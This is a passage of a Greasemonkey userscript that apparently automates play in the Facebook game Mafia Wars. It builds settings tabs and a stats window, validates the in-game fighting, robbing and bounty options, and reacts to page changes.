  for (var i = 0, iLength = cities.length; i < iLength; ++i) {
    id = cities[i][CITY_AUTOBANK];
    title = 'Enable ' + cities[i][CITY_NAME] + ' banking';
    var curBank = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 5px; width: 280px; text-align: left;'});
    makeElement('input', curBank, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
    makeElement('label', curBank, {'for':id}).appendChild(document.createTextNode(title));
    makeElement('img', curBank, {'style':'position: absolute; right: 90px; margin-top: 3px;', 'src':stripURI(cities[i][CITY_CASH_ICON])});
    id = cities[i][CITY_BANKCONFG];
    title = 'Minimum deposit amount in ' + cities[i][CITY_NAME];
    makeElement('input', curBank, {'type':'text', 'style':'position: absolute; right: 0px; width: 85px; text-align: right;', 'title':title, 'value':GM_getValue(id, '50000'), 'id':id, 'size':'5'});
    xTop += 25;
  }
  // Las Vegas: current vault level
  var vaultLevel = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 5px;'});
  title = 'Las Vegas: disable automatic vault handling, or select the level of your vault and let PS MWAP handle it.';
  id = 'vaultHandling';
  //makeElement('label', vaultLevel, {'for':id, 'title':title}).appendChild(document.createTextNode('Las Vegas vault level'));
  makeElement('img', vaultLevel, {'src':stripURI(cashVegasIcon), 'style':'margin-right: 5px;'});
  var vaultSelect = makeElement('select', vaultLevel, {'id':id, 'title':title, 'style':'position: static; text-align: left;'});
  for (i = 0, iLength=vaultLevels.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i});
    choice.appendChild(document.createTextNode(vaultLevels[i][0]));
    vaultSelect.appendChild(choice);
  }
  vaultSelect.selectedIndex = GM_getValue(id, 0);
  /* Las Vegas: automatically deposit max possible chips
  xTop += 25;
  var vaultMax = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 5px;'});
  id = 'autoBankVegasMax';
  title = 'Las Vegas: automatically try again to deposit all your chips (for example if you got attacked and lost money).';
  makeElement('input', vaultMax, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', vaultMax, {'for':id, 'title':title}).appendChild(document.createTextNode('Auto-try again to deposit'));*/

  return cashTab;
}

// Create About tab
function createAboutTab() {
  var elt, title, id, label;
  var aboutTab = makeElement('div', null, {'id': 'aboutTab', 'class': 'tabcontent', 'style': 'background-image:url(' + stripURI(bgTabImage) + ')' });
  var versionInfo = makeElement('div', aboutTab, {'style': 'top: 10px; left: 10px; font-size: 18px; font-weight: bold;'});
  versionInfo.appendChild(document.createTextNode('Version ' + SCRIPT.version));

  var devs = makeElement('div', aboutTab, {'style': 'top: 50px; width: 550px; left: 10px; font-size: 12px; font-weight: bold;'});
  devs.appendChild(document.createTextNode('Contributors:'));
  makeElement('br', devs);

  var devNames = 'CharlesD, Eric Ortego, Jeremy, Liquidor, AK17710N, Fragger, <x51>, ' +
                 'CyB, int1, Janos112, int2str, Doonce, Eric Layne, Tanlis, Cam, ' +
                 'csanbuenaventura, vmzildjian, Scrotal, Bushdaka, rdmcgraw, moe, ' +
                 'KCMCL, caesar2k, crazydude, keli, SamTheButcher, dwightwilbanks, ' +
                 'nitr0genics, DTPN, nonoymsd, donnaB, black1ger, Lister, MaxJ';

  devList = makeElement('p', devs, {'style': 'position: relative; left: 15px;'});
  devList.appendChild(document.createTextNode(devNames));

  // Recent updates
  item = makeElement('div', aboutTab, {'style': 'border:1px solid #999999; padding: 2px 2px 2px 2px; overflow: ' +
                                       'auto; width: 530px; height: 120px; top: 160px; left: 30px; ' +
                                       'font-size: 10px;'});
  item.innerHTML = '<span class="good">Release changes:</span> <br><br>' + GM_getValue('newRevList') + '<br>' +
                   '<span class="bad">Previous changes:</span> <br><br>' + GM_getValue('oldRevList');
  item.innerHTML = 'Revision history pulled out for the mean time...<br><br>Google\'s project hosting servers are being overwhelmed by this feature :D<br><br>PS MWAP Team';

   // Test New Changes
  var devTools = makeElement('div', aboutTab, {'style': 'top: 350px; left: 10px; font-size: 12px;'});
  id = 'TestChanges';
  title = 'Enable Script Modifications In Testing Phase ';
  makeElement('input', devTools, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', devTools, {'for':id,'title':title}).appendChild(document.createTextNode(' Enable Modifications'));

  return aboutTab;
}

function grabUpdateInfo() {
  if (!gvar.isGreaseMonkey) return;
  GM_setValue('newRevList', '');
  GM_setValue('oldRevList', '');
  return;
  GM_xmlhttpRequest({
    method: 'GET',
    url: 'http://code.google.com/p/mwplayer/source/list',
    headers: {'Accept': 'application/atom+xml'},
    onload: function (resp) {
      if (resp.status != 200) return;

      s = (resp.responseText);
      var count = 0;
      var changes = 5;
      var newRevList = '';
      var oldRevList = '';
      while (count < changes + 5) {
        var a = s.indexOf('<td class="id">');
        a = a + 10;
        s = s.substring(a);
        //var searchString = s.match(/href\x3D\x22\x2Fp\x2Fmwplayer\x2Fsource\x2Fdetail\x3Fr\x3D([0-9]+)\x22\x3E/);
        var searchString = s.match(/href\x3D\x22detail\x3Fr\x3D([0-9]+)\x22\x3E/);
        var revisionString = RegExp.$1;
        //var searchString = s.match(/span\sclass\x3D\x22ot\x2Dlogmessage\x22\x3E([\x21,\x22,\x23,\x26,\x27,\x28,\x29,\x2B,\x2C,\x2D,\x2E,\x2F,\x3A,\x3B,\x3F,\x5B,\x5D,\x5F,\x60,A-Z,a-z,0-9,\s]+)\x3C\x2Fspan/);
        var searchString = s.match(/a\sonclick\x3D\x22cancelBubble\x3Dtrue\x22\shref\x3D\x22detail\x3Fr\x3D[0-9]+\x22\x3E([\x21,\x22,\x23,\x26,\x27,\x28,\x29,\x2B,\x2C,\x2D,\x2E,\x2F,\x3A,\x3B,\x3F,\x5B,\x5D,\x5F,\x60,A-Z,a-z,0-9,\s]+)\x3C\x2Fa\x3E/);
        var commentString = RegExp.$1;
        var revLine = 'r' + revisionString + '... ' + commentString.replace('- ', '') + '<br>';
        if (count < changes)
          newRevList += revLine;
        else
          oldRevList += revLine;
        count++;
      }
      GM_setValue('newRevList', newRevList);
      GM_setValue('oldRevList', oldRevList);
    }
  });
}

function validateStaminaTab() {
  var elt, id;

  var checked = function(id) {
    return document.getElementById(id).checked === true ? 'checked' : 0;
  }

  // Create an empty object to hold the settings.
  var s = {};

  // Get the common settings.
  s.staminaSpend = checked('staminaSpend');
  s.staminaSpendHow = document.getElementById('staminaSpendHow').selectedIndex;
  s.staminaNoDelay = checked('staminaNoDelay');
  s.selectStaminaUse = document.getElementById('selectStaminaUse').value;
  s.selectStaminaUseMode = document.getElementById('selectStaminaUseMode').selectedIndex;
  s.selectStaminaKeep = document.getElementById('selectStaminaKeep').value;
  s.selectStaminaKeepMode = document.getElementById('selectStaminaKeepMode').selectedIndex;
  s.allowStaminaToLevelUp = checked('allowStaminaToLevelUp');

  // Validate common settings
  if (isNaN(s.selectStaminaUse) || isNaN(s.selectStaminaKeep)) {
    alert('Please enter numeric values for Stamina reserve and Stamina threshold.');
    return false;
  }

  // The method of getting and verifying the rest of the settings depends
  // on how stamina will be spent.
  switch (s.staminaSpendHow) {
    case STAMINA_HOW_FIGHTROB: // Fight then Rob
      // Get the settings.
      s.robLocation = document.getElementById('robLocation').selectedIndex;
      s.fastRob = checked('fastRob');

    case STAMINA_HOW_FIGHT_RANDOM: // Random fighting
      // Get the specific settings.
      s.fightLocation = document.getElementById('fightRandomLoc').selectedIndex;
      s.reattackThreshold = parseInt(document.getElementById('reattackThreshold').value);
      s.staminaReattack = checked('staminaReattack');
      s.iceCheck = checked('iceCheck');

      s.burstStamina = checked('burstStamina');
      s.burstMode = document.getElementById('burstMode').selectedIndex;
      s.burstPoints = document.getElementById('burstPoints').value;
      s.staminaPowerattack = checked('staminaPowerattack');

      // Validate burstPoints settngs
      if (isNaN(s.burstPoints)) {
        alert('Please enter numeric values for burstPoints.');
        return false;
      } else if (parseInt(s.burstPoints) > maxStamina) {
        alert('Stamina bursts cannot exceed the max stamina.');
        return false;
      }

      s.fightLevelMax = parseInt(document.getElementById('fightLevelMax').value);
      s.fightLevelMaxRelative = checked('fightLevelMaxRelative');
      s.fightMafiaMax = parseInt(document.getElementById('fightMafiaMax').value);
      s.fightMafiaMaxRelative = checked('fightMafiaMaxRelative');
      s.fightMafiaMin = parseInt(document.getElementById('fightMafiaMin').value);
      s.fightMafiaMinRelative = checked('fightMafiaMinRelative');

      s.fightMobMode = checked('fightMobMode');

      s.fightNames = checked('fightNames');
      s.fightAvoidNames = checked('fightAvoidNames');
      s.fightOnlyNames = checked('fightOnlyNames');
      s.fightClanName = document.getElementById('fightClanName').value;
      s.fightRemoveStronger = checked('fightRemoveStronger');

      s.fightStealth = checked('fightStealth');
      //s.fightAvoidBodyguards = checked('fightAvoidBodyguards');

      // Validate reattack settings.
      if (isNaN(s.reattackThreshold)) {
        alert('Please enter the threshold for reattacking opponents.');
        return false;
      } else if (s.reattackThreshold < 0) {
        alert('Please enter a reattack threshold of zero or more.');
        return false;
      }

      // Validate the maximum level settings.
      if (isNaN(s.fightLevelMax)) {
        alert('Please enter a maximum level for fighting.');
        return false;
      } else if (s.fightLevelMaxRelative && s.fightLevelMax < 0) {
        alert('Please enter a maximum relative level of zero or more.');
        return false;
      } else if (!s.fightLevelMaxRelative && s.fightLevelMax < level) {
        addToLog('warning Icon', 'Maximum level for fighting is set to ' + s.fightLevelMax + '. Setting to current level of ' + level + '.');
        s.fightLevelMax = level;
      } else if (!s.fightLevelMaxRelative && level >= 180 &&
                 s.fightLevelMax < 200) {
        alert('Once you reach level 180, only opponents of level 180 and up are displayed. In order to find random opponents, please enter a maximum fight level of 200 at the very least. If necessary, lower the maximum mafia size to compensate.');
        return false;
      } else if (s.fightLevelMaxRelative && level >= 180 &&
                level + s.fightLevelMax < 200) {
        alert('Once you reach level 180, only opponents of level 180 and up are displayed. In order to find random opponents, please enter a relative fight level of at least ' + (200 - s.fightLevelMax) + '. If necessary, lower the maximum mafia size to compensate.');
        return false;
      }

      // Validate the maximum mafia size settings.
      if (isNaN(s.fightMafiaMax)) {
        alert('Please enter a maximum mafia size for fighting.');
        return false;
      } else if (!s.fightMafiaMaxRelative && (s.fightMafiaMax < 1)) {
        alert('Please enter a maximum mafia size of one or more for fighting.');
        return false;
      } else if (s.fightMafiaMaxRelative && (s.fightMafiaMax + mafia < 1)) {
        alert('Please enter a larger relative mafia size for fighting.');
        return false;
      }

      // Validate the minimum mafia size settings.
      if (isNaN(s.fightMafiaMin)) {
        alert('Please enter a minimum mafia size for fighting.');
        return false;
      } else if (!s.fightMafiaMinRelative && (s.fightMafiaMin < 1)) {
        alert('Please enter a minimum mafia size of one or more for fighting.');
        return false;
      } else if (s.fightMafiaMinRelative && (mafia - s.fightMafiaMin < 1)) {
        alert('Please enter a smaller relative mafia size for fighting.');
        return false;
      }

      if(s.fightNames == 'checked'){
        // Validate the fight list.
        var list = s.fightClanName.split('\n');
        if (!list[0]) {
          alert('Enter at least one clan name/symbol in the list');
          return false;
        }
      }

      break;

    case STAMINA_HOW_FIGHT_LIST: // List fighting
      // Get the settings.
      s.fightLocation = document.getElementById('fightListLoc').selectedIndex;
      s.reattackThresholdList = parseInt(document.getElementById('reattackThresholdList').value);
      s.staminaReattackList = checked('staminaReattackList');
      s.iceCheck = checked('iceCheck');

      s.burstStamina = checked('burstStamina');
      s.burstMode = document.getElementById('burstMode').selectedIndex;
      s.burstPoints = document.getElementById('burstPoints').value;
      s.staminaPowerattack = checked('staminaPowerattack');

      if (isNaN(s.burstPoints)) {
        alert('Please enter numeric values for burstPoints.');
        return false;
      } else if (parseInt(s.burstPoints) > maxStamina) {
        alert('Stamina bursts cannot exceed the max stamina.');
        return false;
      }

      s.fightList = document.getElementById('fightList').value;
      s.fightRemoveStronger = document.getElementById('fightRemoveStronger').checked === true? 'checked' : 0;

      // Validate reattack settings.
      if (isNaN(s.reattackThresholdList)) {
        alert('Please enter the threshold for reattacking opponents.');
      } else if (s.reattackThresholdList < 0) {
        alert('Please enter a reattack threshold of zero or more.');
      }

      // Validate the fight list.
      var list = s.fightList.split('\n');
      if (!list[0]) {
        alert('Enter the Facebook ID of at least one opponent to fight.');
        return false;
      }
      break;

    case STAMINA_HOW_HITMAN: // Hitlist bounty collection ("auto-hitman")
      // Get the settings.
      s.hitmanLocation = document.getElementById('hitmanLocation').selectedIndex;

      s.burstStamina = checked('burstStamina');
      s.burstMode = document.getElementById('burstMode').selectedIndex;
      s.burstPoints = document.getElementById('burstPoints').value;
      s.staminaPowerattack = checked('staminaPowerattack');

      // Validate burstPoints settngs
      if (isNaN(s.burstPoints)) {
        alert('Please enter numeric values for burstPoints.');
        return false;
      } else if (parseInt(s.burstPoints) > maxStamina) {
        alert('Stamina bursts cannot exceed the max stamina.');
        return false;
      }

      s.hitmanBountyMin = document.getElementById('hitmanBountyMin').value;
      s.bountySelection = document.getElementById('bountySelection').selectedIndex;

      s.hitmanNames = checked('hitmanNames');
      s.hitmanAvoidNames = checked('hitmanAvoidNames');
      s.hitmanOnlyNames = checked('hitmanOnlyNames');
      s.hitmanClanName = document.getElementById('hitmanClanName').value;
      s.fightRemoveStronger = checked('fightRemoveStronger');

      // Validate the minimum bounty.
      var min = parseCash(s.hitmanBountyMin);
      if (isNaN(min) || min < 0) {
        alert('Please enter a minimum bounty amount.');
        return false;
      }

      if(s.hitmanNames == 'checked'){
        // Validate the fight list.
        var list = s.hitmanClanName.split('\n');
        if (!list[0]) {
          alert('Enter at least one clan name/symbol in the list');
          return false;
        }
      }

      break;

    case STAMINA_HOW_ROBBING: // Robbing
      // Get the settings.
      s.robLocation = document.getElementById('robLocation').selectedIndex;
      s.fastRob = checked('fastRob');
      break;

    case STAMINA_HOW_AUTOHITLIST: // Place hitlist bounties
      // Get the settings.
      s.autoHitListLoc = document.getElementById('autoHitListLoc').selectedIndex;
      s.autoHitListBounty = document.getElementById('autoHitListBounty').value;
      s.autoHitListRandom = checked('autoHitListRandom');
      s.autoHitOpponentList = document.getElementById('autoHitOpponentList').value;
      s.bgAutoHitCheck  = checked('bgAutoHitCheck');

      // Validate the bounty.
      var min = parseCash(s.autoHitListBounty);
      if (isNaN(min) || min < 10000 && !s.autoHitListRandom) {
        alert('Please enter a minimum bounty amount of at least $10,000');
        return false;
      }

      // Validate the autohit list.
      var list = s.autoHitOpponentList.split('\n');
      if (!list[0]) {
        alert('Enter the Facebook ID of at least one opponent to hitlist.');
        return false;
      }
      break;

	/*
      // Get the settings for Robbing.
      s.robLocation = document.getElementById('robLocation').selectedIndex;
      s.fastRob = checked('fastRob');
      // Get the settings for Fighting.
      s.fightLocation = document.getElementById('fightRandomLoc').selectedIndex;
      s.reattackThreshold = parseInt(document.getElementById('reattackThreshold').value);
      s.staminaReattack = checked('staminaReattack');
      s.iceCheck = checked('iceCheck');

      s.burstStamina = checked('burstStamina');
      s.burstMode = document.getElementById('burstMode').selectedIndex;
      s.burstPoints = document.getElementById('burstPoints').value;
      s.staminaPowerattack = checked('staminaPowerattack');

      // Validate burstPoints settngs
      if (isNaN(s.burstPoints)) {
        alert('Please enter numeric values for burstPoints.');
        return false;
      } else if (parseInt(s.burstPoints) > maxStamina) {
        alert('Stamina bursts cannot exceed the max stamina.');
        return false;
      }

      s.fightLevelMax = parseInt(document.getElementById('fightLevelMax').value);
      s.fightLevelMaxRelative = checked('fightLevelMaxRelative');
      s.fightMafiaMax = parseInt(document.getElementById('fightMafiaMax').value);
      s.fightMafiaMaxRelative = checked('fightMafiaMaxRelative');
      s.fightMafiaMin = parseInt(document.getElementById('fightMafiaMin').value);
      s.fightMafiaMinRelative = checked('fightMafiaMinRelative');

      s.fightMobMode = checked('fightMobMode');

      s.fightNames = checked('fightNames');
      s.fightAvoidNames = checked('fightAvoidNames');
      s.fightOnlyNames = checked('fightOnlyNames');
      s.fightClanName = document.getElementById('fightClanName').value;
      s.fightRemoveStronger = checked('fightRemoveStronger');

      s.fightStealth = checked('fightStealth');
      //s.fightAvoidBodyguards = checked('fightAvoidBodyguards');

      // Validate reattack settings.
      if (isNaN(s.reattackThreshold)) {
        alert('Please enter the threshold for reattacking opponents.');
        return false;
      } else if (s.reattackThreshold < 0) {
        alert('Please enter a reattack threshold of zero or more.');
        return false;
      }

      // Validate the maximum level settings.
      if (isNaN(s.fightLevelMax)) {
        alert('Please enter a maximum level for fighting.');
        return false;
      } else if (s.fightLevelMaxRelative && s.fightLevelMax < 0) {
        alert('Please enter a maximum relative level of zero or more.');
        return false;
      } else if (!s.fightLevelMaxRelative && s.fightLevelMax < level) {
        addToLog('warning Icon', 'Maximum level for fighting is set to ' + s.fightLevelMax + '. Setting to current level of ' + level + '.');
        s.fightLevelMax = level;
      } else if (!s.fightLevelMaxRelative && level >= 180 &&
                 s.fightLevelMax < 200) {
        alert('Once you reach level 180, only opponents of level 180 and up are displayed. In order to find random opponents, please enter a maximum fight level of 200 at the very least. If necessary, lower the maximum mafia size to compensate.');
        return false;
      } else if (s.fightLevelMaxRelative && level >= 180 &&
                level + s.fightLevelMax < 200) {
        alert('Once you reach level 180, only opponents of level 180 and up are displayed. In order to find random opponents, please enter a relative fight level of at least ' + (200 - s.fightLevelMax) + '. If necessary, lower the maximum mafia size to compensate.');
        return false;
      }

      // Validate the maximum mafia size settings.
      if (isNaN(s.fightMafiaMax)) {
        alert('Please enter a maximum mafia size for fighting.');
        return false;
      } else if (!s.fightMafiaMaxRelative && (s.fightMafiaMax < 1)) {
        alert('Please enter a maximum mafia size of one or more for fighting.');
        return false;
      } else if (s.fightMafiaMaxRelative && (s.fightMafiaMax + mafia < 1)) {
        alert('Please enter a larger relative mafia size for fighting.');
        return false;
      }

      // Validate the minimum mafia size settings.
      if (isNaN(s.fightMafiaMin)) {
        alert('Please enter a minimum mafia size for fighting.');
        return false;
      } else if (!s.fightMafiaMinRelative && (s.fightMafiaMin < 1)) {
        alert('Please enter a minimum mafia size of one or more for fighting.');
        return false;
      } else if (s.fightMafiaMinRelative && (mafia - s.fightMafiaMin < 1)) {
        alert('Please enter a smaller relative mafia size for fighting.');
        return false;
      }

      if(s.fightNames == 'checked'){
        // Validate the fight list.
        var list = s.fightClanName.split('\n');
        if (!list[0]) {
          alert('Enter at least one clan name/symbol in the list');
          return false;
        }
      }

      break;
      */
    case STAMINA_HOW_RANDOM: // Random stamina spending
      var spendModes="";
      var spendModesChecked=document.getElementsByName("randomSpendModes[]");
      for (var i=0;i<spendModesChecked.length;++i){
        if(spendModesChecked[i].checked) {
          spendModes+='1';
        } else {
          spendModes+='0';
        }
      }
      if(!parseInt(spendModes)) spendModes = '1' + spendModes.substr(1);
      s.randomSpendModes=spendModes;

      var randomCities="";
      var randomCitiesChecked=document.getElementsByName("randomFightLocations[]");
      for (var i=0;i<randomCitiesChecked.length;++i){
        if(randomCitiesChecked[i].checked) {
          randomCities+='1';
        } else {
          randomCities+='0';
        }
      }
      if(!parseInt(randomCities)) randomCities = '1' + randomCities.substr(1);
      s.randomFightLocations=randomCities;

      randomCities="";
      randomCitiesChecked=document.getElementsByName("randomRobLocations[]");
      for (var i=0;i<randomCitiesChecked.length;++i){
        if(randomCitiesChecked[i].checked) {
          randomCities+='1';
        } else {
          randomCities+='0';
        }
      }
      if(!parseInt(randomCities)) randomCities = '1' + randomCities.substr(1);
      s.randomRobLocations=randomCities;

      randomCities="";
      randomCitiesChecked=document.getElementsByName("randomHitmanLocations[]");
      for (var i=0;i<randomCitiesChecked.length;++i){
        if(randomCitiesChecked[i].checked) {
          randomCities+='1';
        } else {
          randomCities+='0';
        }
      }
      if(!parseInt(randomCities)) randomCities = '1' + randomCities.substr(1);
      s.randomHitmanLocations=randomCities;

      break;

    default :
      addToLog('warning Icon', 'BUG DETECTED: Unrecognized stamina setting: ' + 'staminaSpendHow=' + s.staminaSpendHow);
      break;
  }

  return s;
}

function createStatWindow() {
  if (settingsOpen === true) {
    toggleSettings();
  }

  // This creates the stats box just like a facebook popup
  var elt = makeElement('div', document.body, {'class':'generic_dialog pop_dialog', 'id':'sWindowGenDialogPopDialog'});
  elt = makeElement('div', elt, {'class':'generic_dialog_popup', 'style':'top: 30px; width: 620px;'});
  elt = makeElement('div', elt, {'class':'pop_content popcontent_advanced', 'id':'pop_content'});
  var statsWindow = makeElement('div', elt, {'style':'position: fixed; left: 329px; top: 30px; z-index: 101; width: 600px; height: 540px; font-size: 14px; color: #BCD2EA; background: black no-repeat scroll 0 110px', 'id':'statsWindow'});
  //End settings box

  var statsWindowTopBG = makeElement('div', statsWindow, {'style':'background: black; height: 40px;'});
    var statsWindowTitle = makeElement('div', statsWindowTopBG, {'style':'font-size: 18px; font-weight: bold;'});
      statsWindowTitle.appendChild(document.createTextNode('Player Stats '));
      makeElement('br', statsWindowTitle);
    //makeElement('img', statsWindowTopBG, {'src':stripURI(mwLogoSmall), 'style':'position: absolute; top: 0px; right: 25px;'});
    makeElement('img', statsWindowTopBG, {'src':stripURI(closeButtonIcon), 'style':'position: absolute; top: 0px; right: 0px; cursor: pointer;'}).addEventListener('click', toggleStats, false);

  // NOTE: This container is for placing the buttons horizontally.
  elt = makeElement('div', statsWindow, {'style':'text-align: left'});
  // Make the button bar.
  var sWindowTabNav = makeElement('div', elt, {'id':'sWindowTabNav', 'style':'position: static; display: inline-block; background: transparent repeat-x scroll 0 0; border: 1px solid #FFFFFF; fontsize: 13px; line-height: 28px; height: 30px;'});
    var graphTabLink = makeElement('div', sWindowTabNav, {'class':'selected'} );
      makeElement('a', graphTabLink, {'href':'#', 'rel':'graphTab'}).appendChild(document.createTextNode('Graphs'));
    var statTabLink = makeElement('div', sWindowTabNav );
      makeElement('a', statTabLink, {'href':'#', 'rel':'statTab'}).appendChild(document.createTextNode('Stats'));

  var graphTab = makeElement('div', statsWindow, {'id':'graphTab', 'class':'tabcontent'});
    var graphBox = makeElement('div', graphTab, {'id':'graphBox', 'style':'position: static; overflow: auto; height: 443px; width: 578px; background-color: #111111; font-size:10px; color: #BCD2EA; text-align: center; margin: 5px; padding: 5px; border: 1px inset;'});
      graphBox.innerHTML = GM_getValue('graphBox', 'Enable Stats with the Checkbox on the General tab of the AutopPlay settings.<br><br>Stats will populate after the 2nd hour of running.');

  var statTab = makeElement('div', statsWindow, {'id':'statTab', 'class':'tabcontent'});

  createDynamicDrive();
}

function clickAutoPause() {
  if (this.checked) {
    // check to ensure at least one radio box is checked
    // enable Before level up by default
    if (document.getElementById('autoPauseBefore').checked === false &&
        document.getElementById('autoPauseAfter').checked === false) {
      document.getElementById('autoPauseBefore').checked = true;
    }
  }
}

function clickUseFightNames() {
  if (this.checked) {
    // check to ensure at least one radio box is checked
    // enable Before level up by default
    if (document.getElementById('fightAvoidNames').checked === false &&
        document.getElementById('fightOnlyNames').checked === false) {
      document.getElementById('fightAvoidNames').checked = true;
    }
  }
}

function clickUseHitmanNames() {
  if (this.checked) {
    // check to ensure at least one radio box is checked
    // enable Before level up by default
    if (document.getElementById('hitmanAvoidNames').checked === false &&
        document.getElementById('hitmanOnlyNames').checked === false) {
      document.getElementById('hitmanAvoidNames').checked = true;
    }
  }
}

function handleUnexpectedPage() {
  DEBUG('Unexpected page.');

  // Handle "try again" error pages.
  var tryAgainElt = document.getElementById('try_again_button');
  if (tryAgainElt) {
    var delay = 10;
    var p = document.createElement('p');
    var wait = function() {
      if (!delay) return tryAgainElt.click();
      p.innerHTML = 'You will automatically try again in ' +
                    delay-- + ' seconds.';
      window.setTimeout(wait, 1000);
      return false;
    };
    DEBUG('Service interruption: "Try Again" button seen.');
    tryAgainElt.parentNode.appendChild(document.createElement('br'));
    tryAgainElt.parentNode.appendChild(p);
    wait();
    return;
  }

  // Skip "free boost" pages.
  var elt = xpathFirst('//a[contains(., "Skip")]');
  if (elt) {
    Autoplay.fx = function() {
      clickElement(elt);
      DEBUG('Clicked "skip".');
    };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return;
  }

  // Start a timer to reload the page if nothing else happens.
  Autoplay.fx = function() {
    // Unrecognized page.
    if (!document.body) {
      DEBUG('No body. Possible redirect, white out or slow load?');
    } else {
      DEBUG('Can\'t read page. Possible white out?');
    }
    loadHome();
  };
  Autoplay.delay = 10000;
  Autoplay.start();
}

function handleModificationTimer() {
  // The timer has gone off, so assume that page updates have finished.
  //GM_log('Changes finished.');
  modificationTimer = undefined;

  if(new_header){
    var mastheadElt =  xpathFirst('//div[@class="header_top_row"]');
    var elt = mastheadElt;
  } else {
    var elt, mastheadElt = document.getElementById('mw_masthead');
  }
  if (!mastheadElt || !mastheadElt.scrollWidth || !refreshGlobalStats()) {
    handleUnexpectedPage();
    return;
  }
  refreshSettings();
  synchSettings();

  // Find the visible inner page.
  var pageChanged = false;
  var justPlay = false;
  var prevPageElt = innerPageElt;
  appLayoutElt = document.getElementById('mw_city_wrapper');
  statsrowElt = document.getElementById('stats_row');
  mastheadElt = document.getElementById('mw_masthead');
  menubarElt = document.getElementById('menubar');
  popupfodderElt = document.getElementById('popup_fodder');
  innerPageElt = document.getElementById('inner_page');

  if (!innerPageElt) return;

  // Determine if our private AJAX page (for Autoplay) has changed.
  var ajaxElt = document.getElementById(SCRIPT.ajaxPage);
  if (ajaxElt && !xpathFirst('.//div[@id="ajax_flag"]', ajaxElt)) {
    setListenContent(false);
    makeElement('div', ajaxElt, {'id':'ajax_flag', 'style':'display: none;'});
    setListenContent(true);
    DEBUG('New ajax_inner content: ' + ajaxElt.id);
    pageChanged = true;
  }

  // Determine if the displayed page has changed.
  if (!xpathFirst('.//div[@id="inner_flag"]', innerPageElt)) {
    setListenContent(false);
    makeElement('div', innerPageElt, {'id':'inner_flag', 'style':'display: none;'});
    setListenContent(true);
    DEBUG('New inner page content: ' + innerPageElt.id);
    pageChanged = true;
  } else if (prevPageElt != innerPageElt) {
    DEBUG('Switched inner page to: ' + innerPageElt.id);
    pageChanged = true;
  }

  /* Determine if popup_fodder has changed.
  var popupFodderElt = xpathFirst('.//div[@id="popup_fodder"]', appLayoutElt);
  if (popupFodderElt && !xpathFirst('.//div[@id="popup_flag"]', popupFodderElt)) {
    setListenContent(false);
    makeElement('div', popupFodderElt, {'id':'popup_flag', 'style':'display: none;'});
    setListenContent(true);
    DEBUG('New popup_fodder content: ' + popupFodderElt.id);
    pageChanged = true;
    //if (running) justPlay = true;
  }*/

  // Added handling for the new-style job page changes
  var jobResult = xpathFirst('.//div[@id="new_user_jobs"]//div[@class="job_results"]', innerPageElt);
  if (jobResult) {
    if (!xpathFirst('.//div[@id="job_flag"]', jobResult)) {
      setListenContent(false);
      makeElement('div', jobResult, {'id':'job_flag', 'style':'display: none;'});
      setListenContent(true);
      DEBUG('Detected new-style job results.');
      pageChanged = true;
      if (running) justPlay = true;
    }
  }

  //ROJ
  // Added handling for Las Vegas job page changes
  var jobResults = $x('.//div[@id="map_panels"]/div[@id="side_container"]//div[@class="job_results"]', innerPageElt);
  //var jobResults = $x('.//div[@id="map_panels"]/div[@id="side_container"]//div[@class="job_info"]', innerPageElt);
  if (jobResults && jobResults.length > 0) {

    for (var i = 0, iLength=jobResults.length; i < iLength; ++i) {
      if (jobResults[i] && !xpathFirst('./div[@id="job_flag"]', jobResults[i])) {
        setListenContent(false);
        makeElement('div', jobResults[i], {'id':'job_flag', 'style':'display: none;'});
        setListenContent(true);
        DEBUG('Detected Las Vegas job_results change on job ='+i);
        pageChanged = true;
        if (running) justPlay = true;
        DEBUG( 'Flagged');
      } else {
       DEBUG('Already Flagged');
      }
    }
  }

  // Added handling for just rob page changes
  var robResult = xpathFirst('.//a[@id="rob_refresh_cost"]', innerPageElt);
  //var robResult = xpathFirst('.//a[@id="rob_refresh_cost" and @class="sexy_button_new sexy_refresh"]/span/span', innerPageElt);
  if (robResult) {
    if (!xpathFirst('.//div[@id="rob_flag"]', robResult)) {
      setListenContent(false);
      makeElement('div', robResult, {'id':'rob_flag', 'style':'display: none;'});
      setListenContent(true);
      DEBUG('Detected new rob results.');
      pageChanged = true;
      if (running) justPlay = true;
    }
  }

// Only Process when not running
  if (!running) {
    if (onLootTab()) {
      var handleFilterChanged = function() {
        sortLootType = filterLootSelect.selectedIndex;
        if(sortLootType != oldLootType){
          cleanLoot(sortLootType);
          oldLootType = sortLootType;
        }
      }
      var lootElt = xpathFirst('.//div[@class="title"][contains(.,"Loot")]', innerPageElt);
      var oldLootType=0;
      var id = 'filterLootSelect';
      var filterLootSelect = document.getElementById(id);
      if(!filterLootSelect){
        makeElement('br', lootElt, {'class':'hide'});
        var filterLootSelect = makeElement('select', lootElt, {'id':id,'style':'padding-top:3px;'});
        var filterOptions = ['Filter Disabled','Weapons-Attack','Weapons-Defense','Weapons-Combined',
          'Armor-Attack','Armor-Defense','Armor-Combined',
          'Vehicles-Attack','Vehicles-Defense','Vehicles-Combined',
          'Animals-Attack','Animals-Defense','Animals-Combined'];
        for (i = 0, iLength=filterOptions.length; i < iLength; ++i) {
          choice = document.createElement('option');
          choice.value = i;
          choice.appendChild(document.createTextNode(filterOptions[i]));
          filterLootSelect.appendChild(choice);
        }
        filterLootSelect.selectedIndex = GM_getValue('filterLootOpt', 0);
        filterLootSelect.addEventListener('change', handleFilterChanged, false);
        handleFilterChanged();
      }
    }

    if (isGMChecked('HideCollections') && onCollectionsTab()) {
      // Find and remove special event collections from collections page
      var arrCollection=new Array("One-Armed Bandit","Injury Time","22LR","Koenigsberg S10","Military Spy","Fox Hunter",
         "Metsubushi","Irish Wolfhound","Firecrackers","Cupid\'s Arrow","20% more cash","successful robberies by 10%","Maltese Falcon");
      for (item in arrCollection)
      {
        var eltCollection = xpathFirst('//div[@style="float: left;"][contains(., "' + arrCollection[item] + '") and contains(.,"Bonus Received:")]', innerPageElt);
        if (eltCollection) removeCollection(eltCollection);
      }
    }
  }

  if (running) {
    // Popups opened?
